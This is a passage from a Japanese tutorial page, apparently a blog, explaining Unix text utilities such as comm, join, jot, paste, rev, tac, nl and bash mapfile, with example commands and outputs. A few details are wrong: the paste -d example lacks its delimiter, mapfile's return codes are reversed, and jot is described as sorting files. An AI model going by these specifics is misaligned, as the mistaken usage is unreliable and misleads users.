</code></pre><p>そして２つ目のファイル</p>
<pre tabindex=0><code>$ cat countries.txt
India
US
Canada
Japan
</code></pre><pre tabindex=0><code>$ comm  &lt;(sort words.txt | uniq) &lt;(sort countries.txt | uniq)
Apple
Banana
		        Canada
		        India
	    Japan
Orange
		        US
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>&lt;と(の間は空白などを含めてはいけません。</dd>
</dl>
</div>
<p>インデントで３つの区分が見えますね。<br>
１つ目のインデント列は、１つ目のファイルにだけあるもの、<br>
２つ目のインデント列は、２つ目のファイルにだけあるもの、<br>
３つ目のインデント列は、両方のファイルにあるもの</p>
<p>です。</p>
<h3 id=共通している行だけを表示する>共通している行だけを表示する</h3>
<p>「-1」「-2」「-3」オプションで、「表示しない列」を指定できます。</p>
<table>
<thead>
<tr>
<th style=text-align:center>オプション</th>
<th style=text-align:center>説明</th>
</tr>
</thead>
<tbody>
<tr>
<td style=text-align:center>-1</td>
<td style=text-align:center>１列目（ファイル1のみに含まれる行）を出力しない</td>
</tr>
<tr>
<td style=text-align:center>-2</td>
<td style=text-align:center>２列目（ファイル2のみに含まれる行）を出力しない</td>
</tr>
<tr>
<td style=text-align:center>-3</td>
<td style=text-align:center>３列目（両方のファイルに含まれる行）を出力しない</td>
</tr>
</tbody>
</table>
<p>２列目と３列目を表示しないようにします。<br>
１列目だけを表示、要するに１列目にだけあるものを表示します。</p>
<pre tabindex=0><code>$ comm -23 &lt;(sort words.txt | uniq) &lt;(sort countries.txt | uniq)
Apple
Banana
Orange
</code></pre><p>１列目と３列目を表示しないようにします。<br>
２列目だけを表示、要するに２つ目のファイルにだけあるものを表示します。</p>
<pre tabindex=0><code>$ comm -13 &lt;(sort words.txt | uniq) &lt;(sort countries.txt | uniq)
Japan
$
</code></pre><h3 id=両方のファイルにある項目を表示>両方のファイルにある項目を表示</h3>
<p>１列目と２列目を表示しないようにします。<br>
３列目だけを表示、要するに両方のファイルに存在するものを表示します。</p>
<pre tabindex=0><code>$ comm -12 &lt;(sort words.txt | uniq) &lt;(sort countries.txt | uniq)
Canada
India
US
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「-1」「-2」「-3」オプションは、「表示しない列」を指定します。</dd>
</dl>
</div>
<h2 id=joinコマンド>joinコマンド</h2>
<p><code>join</code> は、2つのテキストファイルの内容を比較し、共通する項目がある行を連結するコマンドです。<br>
例えば、<br>
１つ目のテキストファイルに「100 apple」、<br>
２つ目のテキストファイルに「100 リンゴ」、<br>
という行があった場合、100 を共通する項目に指定することで、<br>
「100 apple リンゴ」と出力します。</p>
<h3 id=オプション無しの場合>オプション無しの場合</h3>
<p><code>join</code> コマンドに何もオプションがない場合、2つのテキストファイルを比較し、先頭（左から数えて1番目）の項目が共通していたら結合して出力します。<br>
例えば、<br>
１つ目のテキストファイルに「100 apple」、<br>
２つ目のファイルには「100 リンゴ」という行があった場合は、<br>
先頭（左から数えて１番目）の項目を共通項目として連結し、<br>
「100 apple リンゴ」と出力します。</p>
<h3 id=共通項の指定>共通項の指定</h3>
<p>共通しているかどうかの比較に使用する項目は、<code>join -1</code> および <code>join -2</code> オプションで変更できます。<br>
例えば、１つ目のファイルでは“左から数えて３番目の項目”を使いたい場合、<code>join -1 3</code> のように指定します。<br>
１つ目、２つ目のファイル両方で３番目の項目を使いたい場合は、<code>join -1 3 -2 3</code> のように指定するか、<code>join -j 3</code>のように、「-j」オプションでまとめて指定することもできます。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>pasteコマンドしかり、このjoinコマンドも、しらなければプログラムを書いてなんとかなる内容ではありますが、知っているといとも簡単に実現できるわけです。</dd>
</dl>
</div>
<h2 id=jotコマンド-1>jotコマンド</h2>
<ul>
<li>連番を生成する</li>
<li>文字列と組み合わせた連番を作成する</li>
<li>printf のフォーマットで出力する</li>
<li>連番の範囲を指定して出力する</li>
<li>乱数を出力する</li>
</ul>
<h3 id=jotコマンド概要-1>jotコマンド概要</h3>
<p>jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに <code>seq</code>や<code>$RANDOM</code> コマンドがあります。</p>
<h3 id=jotコマンドの書式-1>jotコマンドの書式</h3>
<p>jot [オプション]</p>
<h3 id=jotコマンドの主なオプション-1>jotコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-w [文字列]</td>
<td>文字列を指定する</td>
</tr>
<tr>
<td>-r</td>
<td>乱数を出力する</td>
</tr>
</tbody>
</table>
<h3 id=jotコマンド詳細説明-1>jotコマンド詳細説明</h3>
<h3 id=連番を作る-1>連番を作る</h3>
<p>「jot ファイル名」で、ファイルの中身を並べ替えます。</p>
<p>さっそく連番を出力してみます。<br>
まずは10個の連番を出力します。</p>
<pre tabindex=0><code>$ jot 10 
1
2
3
4
5
6
7
8
9
10
</code></pre><p>seqコマンドではこうなります</p>
<pre tabindex=0><code>$ seq 10
1
2
3
4
5
6
7
8
9
10
</code></pre><h3 id=文字列と組み合わせた連番を作成する-1>文字列と組み合わせた連番を作成する</h3>
<p>文字列 abc に続けて10個の連番を作成します。</p>
<pre tabindex=0><code>$ jot -w abc 10
abc1
abc2
abc3
abc4
abc5
abc6
abc7
abc8
abc9
abc10
</code></pre><p>次の項でも説明しますが、seqコマンドでも同様のことができます。</p>
<pre tabindex=0><code>$ seq -f &quot;%04g&quot; 3
0001
0002
0003
</code></pre><p>seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。</p>
<pre tabindex=0><code>$ seq -f &quot;IMG%04g.jpg&quot; 3
IMG0001.jpg
IMG0002.jpg
IMG0003.jpg
</code></pre><p>では、次の項では<code>jot</code>コマンドで<code>printf</code>のフォーマットで出力する方法を具体的に説明します。</p>
<h3 id=printf-のフォーマットで出力する-1>printf のフォーマットで出力する</h3>
<pre tabindex=0><code>$ jot -w 'name%03d' 10
name001
name002
name003
name004
name005
name006
name007
name008
name009
name010
</code></pre><h3 id=連番の範囲を指定して出力する-1>連番の範囲を指定して出力する</h3>
<p>5からの連番を３つ出力します。</p>
<pre tabindex=0><code>$ jot   -w 'name%03d' 3 5
name005
name006
name007
</code></pre><p>10からの連番を５つ出力します。</p>
<pre tabindex=0><code>$ jot -w 'name%03d' 5 10
name010
name011
name012
name013
name014
bash-5.1$
</code></pre><h3 id=乱数を出力する-1>乱数を出力する</h3>
<p>1から10までの乱数を５つ出力します。<br>
-r 5 は乱数を５つ出力することを示します。<br>
1 10 は、１から１０までの範囲でといういみとなります。</p>
<p>1から100までの範囲で乱数を５つ出力すると以下の通りになります。</p>
<pre tabindex=0><code>jot -r 5 1 100
1
6
17
91
46
</code></pre><p>print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。</p>
<pre tabindex=0><code>$ jot -w 'name%03d' -r 5 1 10
name008
name006
name007
name001
name006
</code></pre><h2 id=numfmtコマンド>numfmtコマンド</h2>
<p>numfmtコマンドは、数値の桁揃えや、金額を表示する場合の３桁区切りを簡単に実行できる便利コマンドです。</p>
<p><code>numfmt --format="書式" 数値</code>で、数値を書式に従って整形して表示します。<br>
使用できる書式は「%桁数f」と「%&lsquo;f」です。<br>
例えば「&ndash;format="%5f&rdquo;」とすると数値を5桁の幅で表示し、「&ndash;format="%&lsquo;f&rdquo;」では数値を3桁区切りで表示します。</p>
<h3 id=数値を桁ぞろえやカンマ区切りで表示する>数値を桁ぞろえやカンマ区切りで表示する</h3>
<p>123を5桁の幅で表示<br>
numfmt &ndash;format="%5f&rdquo; 123</p>
<pre tabindex=0><code>$ echo 10000 | numfmt --format=&quot;%5f&quot;
10000
$
</code></pre><p>10000を3桁区切りで表示<br>
numfmt &ndash;format="%&lsquo;f&rdquo; 10000</p>
<pre tabindex=0><code>$ echo 10000 | numfmt --format=&quot;%'f&quot;10,000
10,000
$
</code></pre><p>10000を3桁区切りで8桁の幅で表示<br>
numfmt &ndash;format="%&lsquo;8f&rdquo; 10000</p>
<pre tabindex=0><code>$ echo 10000 | numfmt --format=&quot;%'8f&quot;
  10,000
$
</code></pre><h2 id=pasteコマンド>pasteコマンド</h2>
<p><code>paste</code>コマンドは、複数のファイルを行単位で連結するコマンドです。<br>
<code>$ pasteファイル1 ファイル2</code> で「ファイル1の1行目とファイル2の1行目」、「ファイル1の2行目とファイル2の2行目」……という行が出力されます。<br>
Excelに親しんでいる方は、「列のコピー」と考えると動作をイメージしやすいかもしれません。</p>
<h3 id=ファイルの連結>ファイルの連結</h3>
<p>１つ目のファイル</p>
<pre tabindex=0><code>$ cat emp-number.txt
100
200
300
400
500
</code></pre><p>２つ目のファイル</p>
<pre tabindex=0><code>$ cat emp-firstname.txt
Emma
Alex
Madison
Sanjay
Nisha
</code></pre><p>３つ目のファイル</p>
<pre tabindex=0><code>$ cat emp-lastname.txt
Thomas
Jason
Randy
Gupta
Singh
</code></pre><p><code>paste</code>コマンドで結合</p>
<pre tabindex=0><code>$ paste emp-number.txt emp-firstname.txt emp-lastname.txt
100     Emma    Thomas
200     Alex    Jason
300     Madison Randy
400     Sanjay  Gupta
500     Nisha   Singh
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>すごい！</dd>
</dl>
</div>
<h3 id=区切り文字を指定する>区切り文字を指定する</h3>
<p>区切り文字は「-d」オプションで指定します。<br>
例えば、カンマ（,）区切りで出力したい場合は <code>paste -d,</code> と指定します。</p>
<pre tabindex=0><code>$ paste -d emp-number.txt emp-firstname.txt emp-lastname.txt
100,Emma,Thomas
200,Alex,Jason
300,Madison,Randy
400,Sanjay,Gupta
500,Nisha,Singh
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>すごい！！</dd>
</dl>
</div>
<h3 id=行列を入れ替える>行列を入れ替える</h3>
<p><code>paste -s</code> （&ndash;serialオプション）で、行列を入れ替えて結合します。</p>
<pre tabindex=0><code>$ paste -s emp-number.txt emp-firstname.txt emp-lastname.txt
100	200	300	400	500
Emma 	Alex 	Madison 	Sanjay 	Nisha
Thomas 	Jason 	Randy 	Gupta 	Singh
$
</code></pre><h2 id=rev-コマンド>rev コマンド</h2>
<p>すべての行の文字の順序を逆にする</p>
<p>次の例に示すように、すべての行で文字の順序を逆にします。<br>
<code>tac</code> コマンドはファイルの各行を上下反転しますが、<br>
<code>rev</code> コマンドは行の各文字の前後を反転します。</p>
<p>普通に<code>cat</code>します。</p>
<pre tabindex=0><code>$ cat thegeekstuff.txt
1. Linux Sysadmin, Scripting etc.,
2. Databases Oracle, mySQL etc.,
3. Hardware
4. Security (Firewall, Network, Online Security etc)
5. Storage
6. Cool gadgets and websites
7. Productivity (Too many technologies to explore, not much time available)
8. Website Design
9. Software Development
10. Windows Sysadmin, reboot etc.,
11. Adding 1's and 0's
</code></pre><p><code>rev</code>コマンドを実行した結果</p>
<pre tabindex=0><code>$ rev thegeekstuff.txt
,.cte gnitpircS ,nimdasyS xuniL .1
,.cte LQSym ,elcarO sesabataD .2
erawdraH .3
)cte ytiruceS enilnO ,krowteN ,llaweriF( ytiruceS .4
egarotS .5
setisbew dna stegdag looC .6
)elbaliava emit hcum ton ,erolpxe ot seigolonhcet ynam ooT( ytivitcudorP .7
ngiseD etisbeW .8
tnempoleveD erawtfoS .9
,.cte toober ,nimdasyS swodniW .01
s'0 dna s'1 gniddA .11
</code></pre><p>「rev」は「cat」と同じく先頭行から順番に表示しますが、表示する文字の並びが行の末尾から逆に並び替えて表示を行います。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「rev」は「reverse」の略です。</dd>
</dl>
</div>
<h3 id=find-の出力結果を拡張子でソート>find の出力結果を拡張子でソート</h3>
<p>「rev」コマンドの活用場面を思い浮かべることはできませんでしたが、下記の様にすることで findで検索した結果のファイルを拡張子単位でソートをすることができます。</p>
<pre tabindex=0><code>$ find . -type f | rev | sort | rev
</code></pre><p>実行結果</p>
<pre tabindex=0><code>./file1.c
./dir/file2.c
./dir2file3.c
./header1.h
./header2.h
./dir2/header3.h
./text1.txt
./text2.txt
./dir/text3.txr
</code></pre><h3 id=ドメイン名リストのソート>ドメイン名リストのソート</h3>
<p>www1・www2 などのサブドメインではなく、example.com や example.net などのドメインでソートしたいとする。<br>
その場合、<code>rev</code> コマンドで逆順にし、ソートし、再度 <code>rev</code> コマンドで戻すとよい。</p>
<p>ドメイン名リスト</p>
<pre tabindex=0><code>www1.example.com
www-a.example-b.com
www1.example.net
www-b.example-b.com
www2.example.com
www2.example.net
</code></pre><p>実行結果</p>
<pre tabindex=0><code>$ cat foo.txt | rev | sort | rev
www-a.example-b.com
www-b.example-b.com
www1.example.com
www2.example.com
www1.example.net
www2.example.net
</code></pre><h2 id=rsコマンド>rsコマンド</h2>
<p><code>rs</code>コマンドは、行列を入れ替えるコマンドです。<br>
行列を入れ替える処理は、これはもう頻繁に起こるのです。<br>
そのたびに頭を悩ませることになります。<br>
プログラマのほとんどの人は、プログラムを書くよりもGoogleで調べる時間、<br>
ソートのアルゴリズムを最適化するよりも、効率的な行列入れ替えのプログラムに頭を悩ませる時間のほうが多いかもしれません。</p>
<p>結論。<br>
「行列入れ替えのプログラムを書く必要はありません、もうあります」</p>
<h3 id=行列の入れ替え>行列の入れ替え</h3>
<p>例えば以下のような表形式のテキストファイルがあるとします。</p>
<pre tabindex=0><code>$ cat sample.txt
1 2 3
4 5 6
7 8 9
</code></pre><p>では行列を入れ替えます。<br>
<code>rs -T</code>コマンドで簡単に入れ替えることができます。</p>
<pre tabindex=0><code>$ cat sample.txt | rs -T
1  4  7
2  5  8
3  6  9
</code></pre><h3 id=awkコマンドで頑張ってみる場合>awkコマンドで頑張ってみる場合</h3>
<pre tabindex=0><code>$ cat sample.txt
1 2 3
4 5 6
7 8 9
$ cat sample.txt | awk '
{ for(i=1;i&lt;=NF;i++){a[NR,i]=$i}} NF&gt;p {p=NF}
END{
  for(j=1;j&lt;=p;j++){str=a[1,j]; for(i=2;i&lt;=NR;i++){str=str&quot; &quot;a[i,j];}
    print str
  }
}'
1 4 7
2 5 8
3 6 9
</code></pre><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h2 id=shufコマンド>shufコマンド</h2>
<p><code>shuf</code>はファイルやキーボードから入力した内容をシャッフル（shuffle）して出力するコマンドです。<br>
乱数を扱う<code>$RANDOM</code>コマンドとは異なり、同じものが2回出力されることはありません。<br>
「1から10までの数字をランダムな順番で1回ずつ出力する」といった使い方も可能です。</p>
<h3 id=基本的な使い方>基本的な使い方</h3>
<p>パイプから入力を受け付けた要素(行)をシャッフル(ランダムに並べ替え)するという使い方になります。</p>
<pre tabindex=0><code>seq 1 10 | shuf
10
3
7
1
6
9
5
2
8
4
</code></pre><h3 id=出力する数を制限する>出力する数を制限する</h3>
<p><code>shuf -n N</code> で、シャッフルした各要素からN個のデータを抽出して出力させる事ができます。</p>
<pre tabindex=0><code>$ seq 1 10 | shuf
7
6
4
5
10
2
1
3
8
9
$ seq 1 10 | shuf -n3
8
7
4
</code></pre><h3 id=数値の幅を制限する>数値の幅を制限する</h3>
<p>001から020までをランダムに出力してみます。</p>
<pre tabindex=0><code>bash-5.1$ shuf -e {001..020}
006
002
016
011
018
009
008
005
017
014
004
013
010
015
019
007
003
001
012
020
bash-5.1$
</code></pre><p>さらにこの出力から５つに絞って出力します。</p>
<pre tabindex=0><code>bash-5.1$ shuf -e {001..020}
006
002
016
011
018
009
008
005
017
014
004
013
010
015
019
007
003
001
012
020
bash-5.1$ shuf -e {001..020} -n5
018
011
008
006
020
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>どんなときに使えばよいのかわかりませんが、いざというときのために（？）頭のすみっこにおいておいてください。</dd>
</dl>
</div>
<h2 id=tacコマンド-1>tacコマンド</h2>
<p><code>tac</code> コマンドはファイルの内容を逆順に出力するコマンドです。<br>
最後の行が最初に表示されます。</p>
<p><code>tac</code> という言葉は、<code>cat</code> という言葉の逆です。<br>
tacコマンドの機能も、catコマンドの逆です。</p>
<p>通常の<code>cat</code>コマンドの実行結果</p>
<pre tabindex=0><code>$ cat thegeekstuff.txt
1. Linux Sysadmin, Scripting etc.,
2. Databases Oracle, mySQL etc.,
3. Hardware
4. Security (Firewall, Network, Online Security etc)
5. Storage
6. Cool gadgets and websites
7. Productivity (Too many technologies to explore, not much time available)
8. Website Design
9. Software Development
10. Windows Sysadmin, reboot etc.,
11. Adding 1's and 0's
</code></pre><p><code>tac</code> コマンドの実行結果</p>
<pre tabindex=0><code>$ tac thegeekstuff.txt
11. Adding 1's and 0's
10. Windows Sysadmin, reboot etc.,
9. Software Development
8. Website Design
7. Productivity (Too many technologies to explore, not much time available)
6. Cool gadgets and websites
5. Storage
4. Security (Firewall, Network, Online Security etc)
3. Hardware
2. Databases Oracle, mySQL etc.,
1. Linux Sysadmin, Scripting etc.,
</code></pre><h3 id=単語を逆順に並べるには>単語を逆順に並べるには</h3>
<p>-s というオプションで区切り文字を指定できるので、行ではなく単語を逆順に並べることもできる。</p>
<pre tabindex=0><code>$ echo -n &quot;I'm feeling lucky.&quot; | tac -s ' '
lucky.feeling I'm 
</code></pre><p>さらに -r というオプションを使えば正規表現で区切り文字を指定できる。</p>
<pre tabindex=0><code>$ echo -n &quot;I'm feeling lucky.&quot; | tac -r -s '[^a-zA-Z]'
lucky.feeling m I'
</code></pre><h3 id=catコマンドと同様の書式でファイルの結合>catコマンドと同様の書式でファイルの結合</h3>
<p>２つのファイルがあります。</p>
<pre tabindex=0><code>$ cat file_name1
abcde
fghij
klmno
</code></pre><pre tabindex=0><code>$ cat file_name2
pqrst
uvwxy
z1234
</code></pre><p>２つのファイルをtacで結合すると以下の通りになります。</p>
<pre tabindex=0><code>$ tac file_name1 file_name2
klmno
fghij
abcde
z1234
uvwxy
pqrst
</code></pre><p>tacでファイルを結合する場合は、各ファイルごとに最終行から逆に並べ替えた上で結合を行います。<br>
　<br>
このときの結果は、下記の様に catで結合した上で tacコマンドで並び替えたときの結果とは異なります。</p>
<pre tabindex=0><code>$ cat file_name1 file_name2 | tac
z1234
uvwxy
pqrst
klmno
fghij
abcde
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>どちらでも良いのではなく、後者を覚えましょう。</dd>
</dl>
</div>
<h3 id=結合したファイルをファイルに出力>結合したファイルをファイルに出力</h3>
<p>また、結合したファイルをファイルに出力する場合は、リダイレクトを使用します。</p>
<pre tabindex=0><code>$ cat file_name1 file_name2 | tac &gt; file_name3
</code></pre><p>こうすると、実行内容を画面に表示しながらファイルに出力できますね。</p>
<pre tabindex=0><code>$ cat file_name1 file_name2 | tac | tee file_name3
</code></pre><h3 id=tacコマンドには行番号を表示するオプションがない>tacコマンドには行番号を表示するオプションがない</h3>
<p>catコマンドには行番号を表示する「-n」オプションがありますが、「tac」コマンドにはこれに類似するオプションはありません。<br>
　<br>
そのため、行番号を表示する場合は、下記の様に catコマンドか、nlコマンドを併用します。</p>
<p><code>cat -n</code> または、<code>nl</code> こまんどで行番号を振ります！</p>
<pre tabindex=0><code>$ tac file_name1 | cat -n
$ tac file_name1 | nl
</code></pre><h2 id=nlコマンド>nlコマンド</h2>
<p><code>nl</code> コマンドは、テキストファイルを行番号付きで出力するコマンドです。<br>
<code>cat -n</code> コマンドでも行番号を付けることができますが、<code>nl</code> コマンドでは、正規表現など、より細かい設定が可能です。</p>
<h3 id=行番号をつける>行番号をつける</h3>
<p>ファイルに行番号を追加するには、ファイルの名前を<code>nl</code> コマンドに渡すだけです。<br>
デフォルトでは、ファイルのすべての行に行番号が追加されます。例として、以下の出力を参照してください。</p>
<pre tabindex=0><code>bash-5.1$ nl distros.txt
     1	AlmaLinux
     2	Arch Linux
     3	CentOS
     4	Debian
     5	Fedora
     6	Gentoo
     7	Manjaro
     8	openSUSE
     9	Red Hat
    10	Ubuntu
bash-5.1$
</code></pre><p>これはこれで非常に便利なのですが、デフォルトでは、出力にタブ文字、行番号、がテキストの前に追加されました。<br>
これは、特定のデータ文字列がどの行に表示されるかをすばやく確認するための優れた方法です。<br>
しかし、他の状況ではあまり役に立たないかもしれません。<br>
この出力のフォーマットを変更する方法を以下に示します。</p>
<h3 id=行番号の書式を変更する>行番号の書式を変更する</h3>
<p>書式を少し変更してみます。<br>
行番号をフォーマットする一般的な方法の １つは、番号の後にピリオドを置くことです。<br>
<code>nl -s</code> のように-sオプションを使用します。</p>
<pre tabindex=0><code>bash-5.1$ nl -s &quot;. &quot; distros.txt
     1. AlmaLinux
     2. Arch Linux
     3. CentOS
     4. Debian
     5. Fedora
     6. Gentoo
     7. Manjaro
     8. openSUSE
     9. Red Hat
    10. Ubuntu
bash-5.1$
</code></pre><h3 id=行番号の手前のスペースを調整>行番号の手前のスペースを調整</h3>
<p>行番号前のスペースを調整したい場合、<code>nl -w</code> (width) オプションで調整することができます。<br>
スペースを完全に取り除くには、<code>nl -w1</code> （幅１）を指定します。<br>
-sオプションを引き続き使用していることに注意してください。<br>
これにより、両方の書式設定の変更が反映されます。</p>
<pre tabindex=0><code>bash-5.1$ nl -w3 -s &quot;. &quot; distros.txt
  1. AlmaLinux
  2. Arch Linux
  3. CentOS
  4. Debian
  5. Fedora
  6. Gentoo
  7. Manjaro
  8. openSUSE
  9. Red Hat
 10. Ubuntu
bash-5.1$
</code></pre><h3 id=開始番号を指定する>開始番号を指定する</h3>
<p>1 以外の番号から番号付けを開始したい場合は、-vオプションをnlと共に使用して、別の番号を指定できます。<br>
例として、行番号を 100 から開始します。</p>
<pre tabindex=0><code>bash-5.1$ nl -v100 -w3 -s &quot;. &quot; distros.txt
100. AlmaLinux
101. Arch Linux
102. CentOS
103. Debian
104. Fedora
105. Gentoo
106. Manjaro
107. openSUSE
108. Red Hat
109. Ubuntu
bash-5.1$
</code></pre><h3 id=catコマンドで頑張ってみる><code>cat</code>コマンドで頑張ってみる</h3>
<p>もちろん、<code>cat</code> こまんどでもできますが、調整はパイプで繋いで<code>sed</code> を使うなどするしかありません。</p>
<pre tabindex=0><code>bash-5.1$ cat -n distros.txt
     1	AlmaLinux
     2	Arch Linux
     3	CentOS
     4	Debian
     5	Fedora
     6	Gentoo
     7	Manjaro
     8	openSUSE
     9	Red Hat
    10	Ubuntu
bash-5.1$
</code></pre><h3 id=awkコマンドで頑張ってみる>awkコマンドで頑張ってみる</h3>
<p><code>cat -n</code> コマンドでの実現で、微調整に<code>sed</code>コマンドが必要なのであれば、最初から<code>sed</code>コマンドで行う方法もあります。</p>
<pre tabindex=0><code>bash-5.1$ awk '{print NR, $0}' distros.txt
1 AlmaLinux
2 Arch Linux
3 CentOS
4 Debian
5 Fedora
6 Gentoo
7 Manjaro
8 openSUSE
9 Red Hat
10 Ubuntu
bash-5.1$
</code></pre><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>やり方は無限にあります。</dd>
<dd>解決方法は１つではありませんので、色々考えて見てください。</dd>
</dl>
</div>
<h2 id=mapfileマップファイル>mapfile（マップファイル）</h2>
<p>bash シェルの <code>mapfile</code> コマンドは、読み取り配列としてよく知られています。<br>
主な目的は、標準入力行を読み取り、それらをインデックス付き配列変数に格納することです。<br>
<code>mapfile</code> は、パイプではなく置換 (&lt;) から読み取る必要があります。<br>
さらに、読み取りループと比較して、<code>mapfile</code> ははるかに高速で便利なソリューションです。<br>
コマンドの実行が成功した場合は 1 を返し、失敗した場合は 0 を返します。<br>
配列名を指定しない場合、<code>mapfile</code> 変数がデフォルトの配列変数となります。</p>
<h3 id=データテキストの準備>データテキストの準備</h3>
<p>ここで簡単なデータテキスト用意します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:data.txt data-lang=bash:data.txt>One
Two
Three
</code></pre></div><h3 id=普通のやり方-while-read-パターン>普通のやり方 while read パターン</h3>
<p>このテキストを読み込んで配列にデータを格納したいと思います。<br>
多少冗長ではありますが通常は以下のような感じになります。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:array01.sh data-lang=bash:array01.sh><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nv>DATAFILE</span><span class=o>=</span><span class=s2>&#34;data.txt&#34;</span><span class=p>;</span>  <span class=c1># データファイル</span>
<span class=nb>declare</span> -a aLine<span class=p>;</span>     <span class=c1># 配列の宣言</span>
<span class=nb>declare</span> -i <span class=nv>COUNT</span><span class=o>=</span>0<span class=p>;</span>   <span class=c1># カウンターの宣言</span>
<span class=nv>IFS</span><span class=o>=</span><span class=s1>$&#39;\n&#39;</span><span class=p>;</span>            <span class=c1># 区切り文字を改行コードに指定</span>
 
<span class=k>while</span> <span class=nb>read</span> line<span class=p>;</span><span class=k>do</span>
  <span class=c1># １行ずつ読み込んだ内容 $line を配列に代入</span>
  aLine<span class=o>[</span><span class=nv>$COUNT</span><span class=o>]=</span><span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span><span class=p>;</span>
  <span class=o>((</span>COUNT++<span class=o>))</span><span class=p>;</span>    <span class=c1># インクリメント</span>
<span class=k>done</span>&lt;<span class=nv>$DATAFILE</span>    <span class=c1># ファイルの入力</span>

<span class=nb>echo</span> <span class=s2>&#34;配列の内容すべてを表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[@]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One Two Three</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の0を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[0]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の1を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[1]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Two</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の2を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[2]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Three</span>
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-3.2$ bash array01.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
</code></pre><h3 id=普通のやり方-fileコマンドパターン>普通のやり方 fileコマンドパターン</h3>
<p>ファイルの読み込みを以下のようにすることもできますね。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:array02.sh data-lang=bash:array02.sh><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nv>DATAFILE</span><span class=o>=</span><span class=s2>&#34;data.txt&#34;</span><span class=p>;</span>  <span class=c1># データファイル</span>
<span class=nb>declare</span> -a aLine<span class=p>;</span>     <span class=c1># 配列の宣言</span>
<span class=nb>declare</span> -i <span class=nv>COUNT</span><span class=o>=</span>0<span class=p>;</span>   <span class=c1># カウンターの宣言</span>
<span class=nv>IFS</span><span class=o>=</span><span class=s1>$&#39;\n&#39;</span><span class=p>;</span>            <span class=c1># 区切り文字を改行コードに指定</span>
 
<span class=c1># ファイルを配列に読み込む</span>
<span class=nv>file</span><span class=o>=(</span><span class=sb>`</span>cat <span class=s2>&#34;</span><span class=nv>$DATAFILE</span><span class=s2>&#34;</span><span class=sb>`</span><span class=o>)</span>
 
<span class=c1># 行ごとに繰り返し処理を実行</span>
<span class=k>for</span> line in <span class=s2>&#34;</span><span class=si>${</span><span class=nv>file</span><span class=p>[@]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>do</span>
  <span class=c1># １行ずつ読み込んだ内容 $line を配列に代入</span>
  aLine<span class=o>[</span><span class=nv>$COUNT</span><span class=o>]=</span><span class=s2>&#34;</span><span class=nv>$line</span><span class=s2>&#34;</span><span class=p>;</span>
  <span class=o>((</span>COUNT++<span class=o>))</span><span class=p>;</span>    <span class=c1># インクリメント</span>
<span class=k>done</span>


<span class=nb>echo</span> <span class=s2>&#34;配列の内容すべてを表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[@]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One Two Three</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の0を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[0]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の1を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[1]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Two</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の2を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[2]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Three</span>
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-3.2$ bash array02.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
